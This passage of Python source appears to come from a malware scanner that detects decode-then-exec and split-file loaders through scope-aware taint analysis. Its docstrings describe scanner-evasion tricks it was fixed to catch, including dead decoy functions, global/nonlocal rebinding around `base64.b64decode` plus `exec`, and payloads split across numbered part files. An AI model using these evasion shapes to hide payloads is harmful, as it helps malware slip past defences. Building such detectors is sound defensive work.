    t for t in (getattr(ast, "MatchAs", None), getattr(ast, "MatchStar", None)) if t is not None
)
_MATCH_MAPPING_NODE = getattr(ast, "MatchMapping", None)


def _own_bound_names(scope: ast.AST) -> set[str]:
    """Names Python itself would make a local of `scope`: its own parameters, plus
    every def/class name, assignment/for/with/walrus/import/except/match target in
    `scope`'s OWN body, MINUS every name `scope` declares `global` or `nonlocal`
    (B-261 -- see below). The walk STOPS at nested function, class and lambda
    boundaries -- a name bound inside a nested scope is a local of THAT scope and
    shadows nothing out here, so it cannot change what a reference in THIS scope
    resolves to. (A nested def/class still contributes its own NAME, which really is
    bound here; only its body is skipped.)

    B-414: a comprehension (list/set/dict/generator) is handled as a SEPARATE early
    case (see the `_COMPREHENSION_SCOPE_NODES` check just below) rather than folded
    into this general walk -- its own-bound-names are exactly its `for`-target(s),
    nothing else can bind a name inside one, and a walk over its body would otherwise
    wrongly treat a walrus target found there as bound to the COMPREHENSION instead of
    the scope containing it (PEP 572). This general walk's existing behaviour when it
    encounters a comprehension node while computing some OTHER (non-comprehension)
    scope's own bound names is deliberately left as-is: it does not stop at one (no
    entry was ever added for the four comprehension node types), so it still descends
    into a comprehension's `elt`/`ifs`/`iter` looking for exactly the things that DO
    bind in the enclosing scope by real Python semantics -- a walrus target (correct,
    per PEP 572) -- while a `for`-target inside it matches no case here and is
    correctly never picked up as the enclosing scope's own (it belongs to the
    comprehension's own bucket instead, computed by the early-return case below).

    Deliberately position-INSENSITIVE within the scope: Python makes a name local to
    a function for the function's ENTIRE body if it is bound anywhere in it, so a
    rebinding on the last line shadows an outer name on the first line too. That part
    of the old over-approximation was correct and is kept.

    B-214/B-215 replaced an earlier whole-subtree (`ast.walk`) version that also
    collected every binding inside nested functions. That extra over-inclusion was
    wrong in both directions at once, which is why one helper fixes two opposite bugs:

      * B-214 (false NEGATIVE -- an evasion). `_scope_chain_shadow` unions this set
        for every ancestor, so a binding inside ONE nested function stripped the name
        from an unrelated SIBLING nested function that genuinely called the
        module-level helper. Since the attacker authors the file being vetted, a
        two-line, never-called dead decoy (`def _unused(): _decode = None`) was a
        cheap, fully controllable way to silence decode->exec detection on otherwise
        caught malware.
      * B-215 (false POSITIVE). It is also what made precise `nonlocal` target
        resolution impossible -- an intermediate ancestor that merely READS the
        nonlocal-written name lost visibility of it, because the write inside the
        nested function counted as that ancestor's own shadowing binding. See
        `_nonlocal_target_scopes`.

    Both halves had to land together: fixing either alone trades one bug for the
    other.

    B-261 (false NEGATIVE -- an evasion) is the third distinct rule, and the one this
    subtraction encodes: a `global`/`nonlocal` declaration means the name is NOT a
    fresh local of `scope` at all. The assignment rebinds the module (or the enclosing)
    binding IN PLACE, so it must not be counted as a shadow of the very binding it
    writes to. Without the subtraction, a scope that both declared the name and
    consumed it -- `nonlocal x; x = base64.b64decode(...); exec(x)` all inside ONE
    nested function -- seeded the taint into the ancestor bucket (B-215) and then
    subtracted that same ancestor away again in `_tainted_names_visible`, so the exec
    read clean. B-214/B-215 both concerned OTHER scopes' view of the name; this is the
    writing scope's view of its own write.

    Note this is a subtraction, not another special case: a plain local assignment with
    no declaration still shadows exactly as before -- the declaration is the whole
    discriminator, and it is the same one Python's own compiler uses. It also makes
    `_nonlocal_target_scopes` strictly more faithful for free: an ancestor that
    declares the name `global` can never be what a `nonlocal` binds to, and no longer
    claims to be.

    SCOPE OF THIS SET -- read before reusing it as a shadow. "Not a local of `scope`"
    is only HALF of what a `global` declaration means, and it is the only half this
    function is entitled to model. The other half -- that a reference in `scope` skips
    every ENCLOSING FUNCTION and resolves at module level -- is a property of the
    RESOLUTION WALK, not of any one scope's binding set, so it lives in
    `_tainted_names_visible`. Landing the subtraction alone (B-261, first attempt)
    produced a real false-positive FAIL: `global t` in a nested helper made an
    ENCLOSING function's same-named decoded local read as visible taint, which it
    provably never is. The two declarations are NOT symmetric here, and the asymmetry
    is why only one of them needs that extra step:

      * `nonlocal n` resolves to the nearest ENCLOSING FUNCTION that binds `n` --
        Python's syntax guarantees such an ancestor exists -- so the walk stops itself:
        that ancestor contributes `n` to the shadow out of its own binding set, and
        nothing further out (module included) stays visible. Dropping `n` here is
        therefore complete on its own.
      * `global n` carries NO such guarantee. Nothing has to bind `n` between `scope`
        and module, so nothing is obliged to re-contribute the shadow -- and when an
        enclosing function DOES bind `n`, that ancestor is exactly the one whose taint
        must stay hidden, yet its shadow is merged only AFTER its own bucket is read.
        Dropping `n` here is necessary but not sufficient; see `_tainted_names_visible`.
    """
    if isinstance(scope, _COMPREHENSION_SCOPE_NODES):
        # B-414: a comprehension's OWN bound names are exactly its `for`-clause
        # targets, across every `ast.comprehension` in `scope.generators` (multiple
        # `for`s in ONE comprehension share ONE scope -- `[x for a in A for b in B]`
        # binds both `a` and `b` here, not two nested scopes). Nothing else can bind a
        # name here: a comprehension has no statements and no `global`/`nonlocal`
        # (invalid syntax inside one). A walrus (`:=`) found in `elt`/`key`/`value`/
        # `ifs`/a later `iter` binds to the scope CONTAINING the comprehension instead
        # (PEP 572 -- "for the purpose of this rule, the containing scope of a nested
        # comprehension is the scope that contains the outermost comprehension"), never
        # to the comprehension itself, so those parts are deliberately never walked
        # here -- see `_external_tainted_names`'s NamedExpr handling, which bubbles a
        # walrus target's taint past every enclosing comprehension scope to match. A
        # nested comprehension/lambda reachable from `elt`/`ifs`/a later `iter` gets
        # its OWN separate scope bucket (`_build_toplevel_owner_map`) and is resolved
        # on its own pass, exactly like a nested function already is.
        return {
            name
            for gen in scope.generators
            for name in _assign_target_names(gen.target)
        }

    bound: set[str] = set()
    # Names this scope declares as belonging to an OUTER binding. Collected by the same
    # scope-bounded walk as `bound`, so a declaration inside a nested function is not
    # attributed here -- no owner_map needed (cf. `_global_declared_names`, which walks
    # a whole subtree and therefore does need one).
    declared_outer: set[str] = set()

    def add_args(args: ast.arguments) -> None:
        for a in (*args.posonlyargs, *args.args, *args.kwonlyargs):
            bound.add(a.arg)
        if args.vararg:
            bound.add(args.vararg.arg)
        if args.kwarg:
            bound.add(args.kwarg.arg)

    if isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
        add_args(scope.args)
    body = (
        scope.body
        if isinstance(scope, (ast.Module, ast.FunctionDef, ast.AsyncFunctionDef))
        else [scope]
    )
    stack = list(body)
    while stack:
        n = stack.pop()
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            bound.add(n.name)  # the NAME binds here; the body is its own scope
            stack.extend(_enclosing_evaluated_parts(n))
            continue
        if isinstance(n, ast.Lambda):
            # Binds no name of its own here, and its body is its own scope -- but its
            # defaults are evaluated in ours (`_enclosing_evaluated_parts`).
            stack.extend(_enclosing_evaluated_parts(n))
            continue
        if isinstance(n, (ast.Global, ast.Nonlocal)):
            # B-261: declares the name is not a local here. Python forbids declaring a
            # parameter global/nonlocal, so this never fights `add_args`.
            declared_outer.update(n.names)
            continue
        if isinstance(n, ast.Assign):
            for t in n.targets:
                bound |= _assign_target_names(t)
        elif isinstance(n, (ast.AugAssign, ast.AnnAssign)) and isinstance(n.target, ast.Name):
            bound.add(n.target.id)
        elif isinstance(n, (ast.For, ast.AsyncFor)):
            bound |= _assign_target_names(n.target)
        elif isinstance(n, ast.withitem) and n.optional_vars is not None:
            bound |= _assign_target_names(n.optional_vars)
        elif isinstance(n, ast.NamedExpr) and isinstance(n.target, ast.Name):
            bound.add(n.target.id)
        elif isinstance(n, (ast.Import, ast.ImportFrom)):
            for alias in n.names:
                if alias.asname:
                    bound.add(alias.asname)
                elif alias.name != "*":
                    bound.add(alias.name.split(".")[0])
        elif isinstance(n, ast.ExceptHandler) and n.name:
            bound.add(n.name)
        elif isinstance(n, ast.Delete):
            # `del x` makes x local to this scope too (a later read raises
            # UnboundLocalError rather than falling through to an outer binding).
            for t in n.targets:
                bound |= _assign_target_names(t)
        elif _MATCH_BIND_NODES and isinstance(n, _MATCH_BIND_NODES) and n.name:
            bound.add(n.name)
        elif _MATCH_MAPPING_NODE is not None and isinstance(n, _MATCH_MAPPING_NODE) and n.rest:
            bound.add(n.rest)
        stack.extend(ast.iter_child_nodes(n))
    return bound - declared_outer if declared_outer else bound


def _build_toplevel_owner_map(funcs: list, classes: list | None = None) -> tuple[dict, dict]:
    """Map every descendant node of each function to its OWNING function scope, and
    map each scope to its immediate PARENT scope (the real lexical nesting chain) --
    the "owning scope" for shadow/taint-resolution purposes. A node not in the owner
    map is module-level code.

    Every function definition gets its OWN isolated scope bucket, regardless of
    nesting depth: a top-level function; a NESTED function at any depth within it,
    chained back to its immediate enclosing function via the parent map (B-210, C-135
    follow-up on B-205: two unrelated SIBLING nested closures sharing a common
    top-level parent used to collide, since the old flat map folded every descendant
    -- including nested defs -- into the one top-level function; now each nested
    function is isolated like a class method already was, while a genuine closure
    read of an ENCLOSING function's own local still resolves correctly by walking the
    parent chain -- see `_scope_chain_shadow` / `_tainted_names_visible`); and a
    top-level class's own METHOD (B-205), isolated from sibling methods, the class
    body itself, and module level -- a method's parent is always None, never chained
    to an enclosing function even when the class itself sits inside one (methods stay
    islands; real method-closure chaining is out of scope for this fix, unchanged
    from B-205). Recurses into a nested class-within-a-class (`class Outer: class
    Inner: def load(self): ...`) so `Inner`'s methods get scoped too (C-135 round 2
    found the one-level-only version reopened the same collision for that shape).

    B-414: a `Lambda` and a comprehension (list/set/dict/generator) ALSO get their own
    isolated scope bucket now, at ANY nesting depth, the same way a nested function
    already did -- `ast.Lambda` was already named in `_NESTED_SCOPE_NODES` (implying it
    should behave like one) but was never actually special-cased here, so a call inside
    a lambda body was silently owned by the ENCLOSING function instead; a comprehension
    had no case at all. Lambda reuses `_map_function_scope` below (generic despite the
    name: it only sets `parent_scope[node] = enclosing` and recurses treating `node`
    itself as the new scope, which is exactly right for it too). A comprehension gets
    its own `_map_comprehension_scope` instead of also reusing `_map_function_scope`
    unmodified: C-135 (self-review) found that blindly attributing EVERY part of a
    comprehension to its own new bucket reopens a DIFFERENT false negative when a
    `for`-target's bare name collides with its OWN iterable's bare name (`for cmds in
    cmds`, an unusual but syntactically ordinary self-referential rebind) -- real
    Python evaluates only the FIRST generator's iterable in the scope CONTAINING the
    comprehension (PEP 530), before the comprehension's own `for`-target binding
    exists at all, so `_own_bound_names(comp_node)` including that same-named target
    must not shadow the outer occurrence. `_map_comprehension_scope` maps that one
    expression to the enclosing scope instead, mirroring `_enclosing_evaluated_parts`'s
    existing precedent for a nested function/lambda's own decorator/default/annotation
    expressions (also evaluated in the enclosing scope despite sitting inside the
    nested node). Every other part of the comprehension -- that generator's own
    target, all `ifs`, every OTHER generator's target/iter (which CAN see earlier
    targets -- real Python scoping), and elt/key/value -- still belongs to the
    comprehension's own bucket. Deliberately NOT via `_NESTED_SCOPE_NODES` itself,
    which also gates `_scope_own_nodes` for unrelated consumers (B-413 layer 2's
    argv-list resolution, TT4's decode-composing walk) that must keep seeing a
    comprehension's own calls/assignments as part of the enclosing function -- see
    `_COMPREHENSION_SCOPE_NODES`'s own comment for why widening `_NESTED_SCOPE_NODES`
    itself was rejected."""
    owner: dict = {}
    parent_scope: dict = {}

    def _dispatch_child(child: ast.AST, scope: ast.AST) -> None:
        if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)):
            _map_function_scope(child, scope)
        elif isinstance(child, _COMPREHENSION_SCOPE_NODES):
            _map_comprehension_scope(child, scope)
        elif isinstance(child, ast.Lambda):
            _map_function_scope(child, scope)
        else:
            _map_scope_subtree(child, scope)

    def _map_scope_subtree(node: ast.AST, scope: ast.AST) -> None:
        owner.setdefault(node, scope)
        for child in ast.iter_child_nodes(node):
            _dispatch_child(child, scope)

    def _map_function_scope(fn: ast.AST, enclosing) -> None:
        parent_scope[fn] = enclosing
        _map_scope_subtree(fn, fn)

    def _map_comprehension_scope(comp_node: ast.AST, enclosing) -> None:
        """B-414: like `_map_function_scope`, but the FIRST generator's own `iter`
        expression is mapped to `enclosing`, NOT to `comp_node` -- real Python (PEP
        530) evaluates only that one expression in the scope CONTAINING the
        comprehension, before the comprehension's own `for`-target binding exists.
        Every other part (that generator's own target, every `ifs`, every OTHER
        generator's target/iter, and elt/key/value) belongs to `comp_node`'s own
        bucket, same as `_map_function_scope` would give it."""
        parent_scope[comp_node] = enclosing
        owner.setdefault(comp_node, comp_node)
        generators = getattr(comp_node, "generators", None) or ()
        first_iter = generators[0].iter if generators else None
        if first_iter is not None:
            _map_scope_subtree(first_iter, enclosing)
        for child in ast.iter_child_nodes(comp_node):
            if child is first_iter:
                continue  # already mapped to `enclosing` above
            _dispatch_child(child, comp_node)

    for fn in funcs:
        _map_function_scope(fn, None)

    def _map_class_methods(cls: ast.AST) -> None:
        # B-213: a method's OWN nested closures now get their own isolated
        # scope buckets too (mirroring _map_function_scope/_map_scope_subtree, already
        # used for plain top-level functions since B-210) instead of a flat ast.walk
        # folding the method's entire subtree -- including any nested `def` inside it
        # -- into one bucket. Without this, a `global X` declared inside a helper
        # closure NESTED within a method got attributed to the whole method, wrongly
        # promoting the method's own unrelated same-named local to the module-wide taint
        # bucket (the same collision B-210 fixed for plain nested functions).
        for member in cls.body:
            if isinstance(member, (ast.FunctionDef, ast.AsyncFunctionDef)):
                parent_scope.setdefault(member, None)
                _map_scope_subtree(member, member)
            elif isinstance(member, ast.ClassDef):
                _map_class_methods(member)

    for cls in classes or ():
        _map_class_methods(cls)
    return owner, parent_scope


def _scope_chain_shadow(scope: ast.AST, parent_scope: dict, shadow_cache: dict) -> set[str]:
    """Union of the own-bound-name sets (see `_own_bound_names`) of `scope` and every
    ancestor scope up its real lexical nesting chain (B-210) -- a name locally rebound
    at ANY enclosing level between a node and module scope is no longer resolvable to
    an outer/module binding of the same name, so the check must walk the whole chain,
    not just the node's own immediate scope.

    `shadow_cache` is the per-scope `_own_bound_names` memo, shared with
    `_tainted_names_visible` and `_nonlocal_target_scopes` so each scope is analysed
    once per file."""
    shadowed: set[str] = set()
    s = scope
    while s is not None:
        if s not in shadow_cache:
            shadow_cache[s] = _own_bound_names(s)
        shadowed |= shadow_cache[s]
        s = parent_scope.get(s)
    return shadowed


def _decode_composing_visible(
    node: ast.AST, composing: set[str], owner_map: dict, parent_scope: dict, shadow_cache: dict
) -> set[str]:
    """The subset of `composing` actually visible (not locally shadowed anywhere along
    node's real lexical scope chain -- B-210) at `node`'s position -- see
    `_own_bound_names` / `_scope_chain_shadow`. Module-level nodes (not
    owned by any function) see the full `composing` set unmodified."""
    if not composing:
        return composing
    scope = owner_map.get(node)
    if scope is None:
        return composing
    shadowed = _scope_chain_shadow(scope, parent_scope, shadow_cache)
    return (composing - shadowed) if shadowed else composing


def _function_composes_decode(fn: ast.AST, composing: set[str]) -> bool:
    """C-202 (+ C-135 round-2 fix): True only when a decode primitive/xor-shape, or a
    call to an already-known decode-composing function, is reachable through the
    function's OWN return value(s) -- never merely present anywhere in its body. A
    decode call in a dead/debug branch (or a nested closure) whose result is discarded
    must not taint the whole function name: `if debug: base64.b64decode(b'x')`
    followed by `return 'literal'` must stay silent, since the decoded bytes never
    reach what the function actually returns."""

    def subtree_is_decode_ish(node: ast.AST) -> bool:
        for n in ast.walk(node):
            if _is_decode_primitive_call(n):
                return True
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in composing:
                return True
        return _has_xor_decode(node)

    own_nodes = list(_scope_own_nodes(fn))
    tainted: set[str] = set()
    for _ in range(4):
        changed = False
        for node in own_nodes:
            if isinstance(node, ast.Assign):
                rhs = node.value
                if subtree_is_decode_ish(rhs) or (isinstance(rhs, ast.Name) and rhs.id in tainted):
                    for t in node.targets:
                        if isinstance(t, ast.Name) and t.id not in tainted:
                            tainted.add(t.id)
                            changed = True
        if not changed:
            break

    for node in own_nodes:
        if isinstance(node, ast.Return) and node.value is not None:
            rv = node.value
            if subtree_is_decode_ish(rv) or (isinstance(rv, ast.Name) and rv.id in tainted):
                return True
    return False


def _decode_composing_funcnames(tree: ast.AST) -> set[str]:
    """C-202: MODULE-LEVEL function names that COMPOSE decode work into their return
    value (a base64/zlib/hex primitive, an xor-decode shape, or a call to another
    decode-composing function) -- the `_decode()`-style top-level wrapper helper that a
    naive decode->exec check misses when the payload is routed through it before
    reaching exec/eval. Resolved to a small fixpoint so a wrapper that only calls
    ANOTHER decode-composing function (chained/multi-stage wrappers, e.g. a `_decode()`
    that just calls `_step2()`, which does the actual base64 call) is recognised too.

    C-135 (adversarial review, round 1) found that matching class METHOD names by bare
    string, with no receiver/scope resolution, let an unrelated same-named method
    elsewhere in the file (e.g. two different classes each defining
    `resolve`/`load`/`compose`) cross-contaminate a legitimate dynamic-evaluation call -- a
    real crit false-FAIL. A module-level `def` name is unique within a file (Python
    does not allow two top-level defs of the same name to coexist), so restricting to
    top-level functions only closes that collision without giving up the
    wrapper-indirection case this task targets (which is itself always a top-level
    helper in the real-world samples).

    C-135 round 2 found that even restricted to module level, treating a decode call
    ANYWHERE in the function body (not just on its return path) as the composing
    signal let a decode call in an unreachable/discarded branch taint a function whose
    actual return value never touched it. `_function_composes_decode` requires the
    decode signal to flow into the function's own `return`.

    C-135 round 3 found that even return-path-scoped, a bare-name match against
    `composing` could fire inside a function whose OWN body locally rebinds that same
    name (a parameter, a nested helper, or a local reassignment) -- an ordinary name
    reused elsewhere in the file (e.g. `_decode`, `process`, `parse`) is not the same
    function just because it shares a string. Each candidate function only sees the
    composing names it does not itself rebind in its own body (`_own_bound_names`;
    B-214 narrowed that from the old whole-subtree walk, which let a binding in a
    never-called nested decoy suppress the match)."""
    funcs = [
        n
        for n in getattr(tree, "body", [])
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
    ]
    shadowed_by_fn = {fn: _own_bound_names(fn) for fn in funcs}
    composing: set[str] = set()
    for _ in range(4):
        changed = False
        for fn in funcs:
            if fn.name in composing:
                continue
            shadowed = shadowed_by_fn[fn]
            visible = (composing - shadowed) if shadowed else composing
            if _function_composes_decode(fn, visible):
                composing.add(fn.name)
                changed = True
        if not changed:
            break
    return composing


def _subtree_calls_decode_composing(node: ast.AST, composing: set[str]) -> bool:
    """C-202: True when `node`'s subtree calls a decode-composing MODULE-LEVEL function
    by bare name (`_decode(...)`) -- the wrapper-indirection form of decode->exec that
    plain `_subtree_has_decode` (inline decode primitives only) misses. Bare-name-only
    (no `obj.attr(...)` match) by design -- see `_decode_composing_funcnames` docstring
    for the C-135 collision this avoids."""
    if not composing:
        return False
    return any(
        isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in composing
        for n in ast.walk(node)
    )


# B336: CHUNKED_FILE_EXEC — a locally-defined helper reads and joins MULTIPLE chunked/
# part files (e.g. `_load.part1.txt`, `.part2.txt`, `.part3.txt`) at runtime, and the
# assembled result is passed to exec()/eval() -- the "split-by-file" scanner-evasion
# loader shape (a payload that never exists whole in any single shipped .py file).
# WARN-only (severity "info"): see analyze_python's own crit/info convention -- this
# never becomes FAIL on its own, and checks/_vet.py's check_installed_skills routes it
# through an explicit continue-branch so it can never reach that function's generic
# crit/cred-exfil fallthrough either (the actual FAIL-capability landmine this design
# closes for).
#
# Three legs, all required:
#   1. sink        -- a call to exec()/eval() (bare name, in _EXEC_NAMES).
#   2. source+shape -- the sink's argument traces, via ONE hop through a locally-defined
#      TOP-LEVEL helper function's own RETURN value (mirrors B-284's
#      `_remote_returning_funcs`/`_remote_code_load_findings` one-hop pattern, source
#      swapped from "network fetch" to "multi-file read"), to a helper that reads >=2
#      files in a loop (accumulated via `.append()`+join or `+=`) or as 2+ unrolled
#      direct read expressions joined into what it returns. None of the read literal
#      paths may be a `.py`/`.pyw`/`.pyi` file -- a real multi-file Python import/build
#      graph is structurally excluded, not just by never touching exec/eval at all.
#   3. corroborator -- the literal file paths read share one common stem+extension,
#      the stem ending in an explicit chunk/part marker word (`part`/`chunk`/
#      `segment`/`piece`), differing only by a numeric index right after that marker
#      (`_paths_are_chunked`) -- the "chunked/multi-part files" shape. A single
#      non-chunked file, or 2+ files with unrelated names, does not corroborate and is
#      NOT flagged (proven by a dedicated fixture). C-135 (independent review, SkillTrust
#      Bench SC-005 pass) found the original regex required only a bare trailing digit
#      before the extension -- no marker word at all -- so it also matched ordinary
#      version-numbered or otherwise-numbered *independent* resource files that are not
#      fragments of one split payload (e.g. `strings_v1.txt`/`strings_v2.txt`, a
#      two-locale string table). Requiring an explicit marker word narrows leg 3 to the
#      documented "chunked/part files" shape and excludes that class of false positive.
_CHUNK_READ_ATTRS = {"read", "read_text", "read_bytes"}
_CHUNK_NAME_RE = re.compile(
    r"^(?P<stem>.*?(?:part|chunk|segment|piece)[._-]?)(?P<idx>\d+)(?P<ext>\.[A-Za-z0-9]+)$",
    re.IGNORECASE,
)
_CHUNK_EXEMPT_EXTS = (".py", ".pyw", ".pyi")


def _is_open_call(node: ast.AST) -> bool:
    """True when *node* is a call to `open(...)` or `<obj>.open(...)` (e.g.
    `pathlib.Path(p).open()`) -- either spelling of "open a file for reading" this
    rule's shape needs to recognise."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    return (isinstance(f, ast.Name) and f.id == "open") or (
        isinstance(f, ast.Attribute) and f.attr == "open"
    )


def _open_read_handle_paths(fn: ast.AST) -> dict[str, str]:
    """Map a file-handle name -> the literal path it was opened for READING at, within
    `fn`'s own body -- the read-side twin of `_open_path_bindings` (which tracks
    WRITE-mode handles for B-284's staged-exec detector). Covers both
    `with open(P) as h:` and `h = open(P)`. The literal path is "" when the open()
    argument is not a string constant (the common chunked-loop case, where the open()
    argument is a loop variable, not a literal) -- callers that need the literal path
    resolve it some other way (here, from the loop's own iterable); callers that only
    need to know WHICH names are read-handles use this dict's keys.
    """
    out: dict[str, str] = {}
    for node in _scope_own_nodes(fn):
        if isinstance(node, ast.With):
            for item in node.items:
                if _is_open_call(item.context_expr) and isinstance(item.optional_vars, ast.Name):
                    call = item.context_expr
                    path = _literal_str(call.args[0]) if call.args else ""
                    out[item.optional_vars.id] = path
        elif isinstance(node, ast.Assign) and _is_open_call(node.value):
            path = _literal_str(node.value.args[0]) if node.value.args else ""
            for t in node.targets:
                if isinstance(t, ast.Name):
                    out[t.id] = path
    return out


def _is_file_read_chain(node: ast.AST, handles: set) -> bool:
    """True for `open(...).read()`-family chained directly, or `h.read()`-family where
    `h` is a name in `handles` (bound by a `with open(...) as h:` / `h = open(...)` in
    the same function scope)."""
    if not isinstance(node, ast.Call):
        return False
    f = node.func
    if not (isinstance(f, ast.Attribute) and f.attr in _CHUNK_READ_ATTRS):
        return False
    recv = f.value
    if isinstance(recv, ast.Name) and recv.id in handles:
        return True
    return _is_open_call(recv)


def _paths_are_chunked(paths: list) -> bool:
    """Leg 3 corroborator: True when >=2 of *paths* share one (stem, extension) pair,
    the stem ending in an explicit chunk/part marker word, differing only by a numeric
    index right after that marker -- e.g. `_load.part1.txt` / `.part2.txt`. An ordinary
    numbered filename with no marker word (`strings_v1.txt` / `strings_v2.txt`) does
    NOT corroborate -- see `_CHUNK_NAME_RE`. Any unresolved ("") path, or any path
    ending in a Python source extension (`_CHUNK_EXEMPT_EXTS` -- a real multi-file
    Python import/build graph), disqualifies the WHOLE set: never fabricate a leg-3
    pass from unresolved or out-of-scope data."""
    if len(paths) < 2:
        return False
    groups: dict = {}
    for p in paths:
        if not p:
            return False
        base = p.rsplit("/", 1)[-1]
        if base.lower().endswith(_CHUNK_EXEMPT_EXTS):
            return False
        m = _CHUNK_NAME_RE.match(base)
        if not m:
            continue
        key = (m.group("stem"), m.group("ext").lower())
        groups.setdefault(key, set()).add(m.group("idx"))
    return any(len(idxs) >= 2 for idxs in groups.values())


def _resolve_iter_literal_paths(iter_node: ast.AST, tree: ast.AST, fn: ast.AST) -> list:
    """Resolve a `for x in <iter_node>:` iterable to a list of literal path strings --
    either an inline List/Tuple literal, or a Name bound EXACTLY ONCE to one (checked
    in `fn`'s own scope first, then module scope -- `_single_list_bindings_local`'s
    existing single-binding discipline, reused verbatim from its subprocess-argv use).
    Returns [] (never fabricates a partial resolution) when the iterable isn't provably
    one of those two shapes."""
    target = iter_node
    if isinstance(target, ast.Name):
        local = _single_list_bindings_local(fn).get(target.id)
        target = local if local is not None else _single_list_bindings_local(tree).get(target.id)
    if isinstance(target, (ast.List, ast.Tuple)):
        return [_literal_str(e) for e in target.elts]
    return []


def _chunked_read_composing_funcnames(tree: ast.AST) -> dict:
    """Leg 2: MODULE-LEVEL function names that compose a chunked multi-file read into
    their own RETURN value, mapped to the literal file paths they read -- the read-side
    twin of `_decode_composing_funcnames`/`_function_composes_decode`, restricted to
    top-level functions only for the same C-135 same-name-collision reason (a
    module-level `def` name is unique within a file).

    Two shapes, either satisfies:
      - loop form: a `for`/`async for` loop reads >=2 files (via a handle from
        `_open_read_handle_paths`, or `open(...).read()`-family chained directly) and
        accumulates them (`.append()` to a list, or `+=`) into a name that flows
        (through a small fixpoint, mirroring `_function_composes_decode`'s own
        4-iteration bound) into the function's own `return`. The literal paths are
        resolved from the loop's OWN iterable via `_resolve_iter_literal_paths`.
      - unrolled form: the function's own `return` expression directly contains 2+
        file-read-chain expressions (`a.read() + b.read()`, `"".join([a.read(),
        b.read()])`) -- the literal paths are each read's own `open(...)` literal arg.

    A function satisfying neither shape is simply absent from the returned dict --
    this is a detection gate, not a taint-completeness guarantee (Best-effort, like the
    rest of this module)."""
    funcs = [
        n
        for n in getattr(tree, "body", [])
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
    ]
    composing: dict = {}
    for fn in funcs:
        own_nodes = list(_scope_own_nodes(fn))
        handle_paths = _open_read_handle_paths(fn)
        handles = set(handle_paths)

        # Find an accumulator name fed by a read-chain: `acc.append(<read-chain>)` or
        # `acc += <read-chain>`.
        accumulator = None
        for node in own_nodes:
            if (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "append"
                and isinstance(node.func.value, ast.Name)
                and any(_is_file_read_chain(n, handles) for a in node.args for n in ast.walk(a))
            ):
                accumulator = node.func.value.id
                break
            if (
                isinstance(node, ast.AugAssign)
                and isinstance(node.op, ast.Add)
                and isinstance(node.target, ast.Name)
                and any(_is_file_read_chain(n, handles) for n in ast.walk(node.value))
            ):
                accumulator = node.target.id
                break

        matched = False
        paths: list = []

        if accumulator is not None:
            tainted = {accumulator}
            for _ in range(4):
                changed = False
                for node in own_nodes:
                    if isinstance(node, ast.Assign) and (_names_in(node.value) & tainted):
                        for t in node.targets:
                            if isinstance(t, ast.Name) and t.id not in tainted:
                                tainted.add(t.id)
                                changed = True
                if not changed:
                    break
            for node in own_nodes:
                if isinstance(node, ast.Return) and node.value is not None:
                    if _names_in(node.value) & tainted:
                        matched = True
                        break
            if matched:
                for node in own_nodes:
                    if isinstance(node, (ast.For, ast.AsyncFor)):
                        loop_paths = _resolve_iter_literal_paths(node.iter, tree, fn)
                        if loop_paths:
                            paths = loop_paths
                            break

        if not matched:
            # Unrolled form: 2+ direct file-read-chain expressions inside the
            # function's own return.
            for node in own_nodes:
                if isinstance(node, ast.Return) and node.value is not None:
                    reads = [n for n in ast.walk(node.value) if _is_file_read_chain(n, handles)]
                    if len(reads) >= 2:
                        matched = True
                        for r in reads:
                            recv = r.func.value
                            if isinstance(recv, ast.Name) and recv.id in handle_paths:
                                paths.append(handle_paths[recv.id])
                            elif _is_open_call(recv) and recv.args:
                                paths.append(_literal_str(recv.args[0]))
                            else:
                                paths.append("")
                        break

        if matched:
            composing[fn.name] = paths
    return composing


def _chunked_file_exec_findings(tree: ast.AST) -> list:
    """(lineno, reason) for every exec/eval sink fed by a chunked-multi-file-read-
    composing helper (see `_chunked_read_composing_funcnames`), gated on the leg-3
    chunk-naming corroborator (`_paths_are_chunked`). Mirrors `_remote_code_load_
    findings`'s taint-hop shape for the assigned-then-passed form (`src = _load();
    exec(src)`), and additionally matches the inline form (`exec(compile(_load(), ...))`)
    via the same bare-name-call test `_subtree_calls_decode_composing` uses -- with one
    deliberate difference: the taint fixpoint here is SCOPE-AWARE (bucketed per owning
    scope via `_build_toplevel_owner_map`/`_tainted_names_visible`, the same model
    `_tainted_names` already uses for the decode->exec check), where `_remote_code_
    load_findings` still matches tainted names as bare strings module-wide.

    C-135 (independent review, SkillTrustBench SC-005 pass) found that a module-wide,
    scope-blind fixpoint let an unrelated function elsewhere in the file -- one that
    merely reuses the same bare identifier for its OWN local (a very common real-world
    shape with generic names like `data`/`content`/`template`/`result`) -- have its own,
    unrelated exec()/eval() call wrongly flagged as "fed by chunked files," even with
    zero actual data flow between the two. composing_names (leg 2) are already
    restricted to unique top-level def names, so there is no decode-composing-style
    `global`/`nonlocal` indirection specific to THAT set to resolve -- but the taint a
    hop introduces still needs to respect ordinary lexical scoping once it starts
    propagating through further name-to-name assignments, exactly like decode taint
    does.

    B-417 (independent review, C-135 follow-up): when a file has MORE THAN ONE
    composing helper, leg 3 used to be evaluated against the UNION of every composing
    helper's paths in the file, not just whichever one actually fed THIS sink -- so an
    unrelated helper that happens to read genuinely chunked DATA files (e.g. a schema
    index sharded to stay under a hosting limit) could donate chunk-shaped path
    evidence to a completely different, non-chunked exec()/eval() call elsewhere in the
    same file. Fixed by running the taint fixpoint ONCE PER composing helper, seeded
    only from calls to that one helper (`_propagate`), so each sink's `fed_paths` are
    attributed to exactly the helper(s) that actually flow into it -- still the union of
    every helper that GENUINELY feeds a given sink (e.g. `exec(a() + b())`), just never
    a helper that plays no part in that particular call."""
    composing = _chunked_read_composing_funcnames(tree)
    if not composing:
        return []
    composing_names = set(composing)

    _toplevel_funcs = [
        n for n in getattr(tree, "body", []) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
    ]
